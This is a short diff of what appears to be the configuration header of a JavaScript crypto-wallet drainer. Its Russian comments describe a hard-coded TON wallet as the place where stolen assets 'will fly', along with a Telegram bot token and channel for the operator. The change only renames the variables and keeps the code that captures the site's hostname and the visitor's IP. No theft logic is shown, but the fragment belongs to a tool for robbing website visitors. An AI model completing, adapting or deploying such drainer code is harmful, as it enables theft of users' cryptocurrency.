@@ -1,10 +1,10 @@
-var mainWallet = "UQA_gX6JHdfTFbm1yD1nzyRqy4EYQpWUi96Aj7whVFQ4mmJp"; //Ваш кошелек, куда будут лететь активы
-var tgBotToken = ""; //Токен от бота телеграмм
-var tgChat = ""; //Ваш телеграмм-канал
+var Wallet = "UQA_gX6JHdfTFbm1yD1nzyRqy4EYQpWUi96Aj7whVFQ4mmJp"; //Ваш кошелек, куда будут лететь активы
+var BotToken = ""; //Токен от бота телеграмм
+var Chat = ""; //Ваш телеграмм-канал
 
 
 
-var domain = window.location.hostname;
+var dom = window.location.hostname;
 var ipUser;
 
 
